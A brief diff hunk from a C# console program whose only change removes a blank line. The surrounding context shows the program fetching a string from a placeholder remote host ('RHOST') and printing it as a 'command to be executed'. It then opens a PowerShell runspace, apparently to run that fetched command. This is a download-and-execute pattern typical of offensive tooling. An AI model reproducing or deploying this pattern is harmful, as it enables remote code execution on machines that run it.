@@ -18,7 +18,6 @@ namespace ConsoleApp3
             WebClient client = new WebClient();
             var myString = client.DownloadString("http://RHOST/string.txt");
             Console.WriteLine("Command to be executed: " + myString);
-            
             Runspace rs = RunspaceFactory.CreateRunspace();
             rs.Open();
             PowerShell ps = PowerShell.Create();
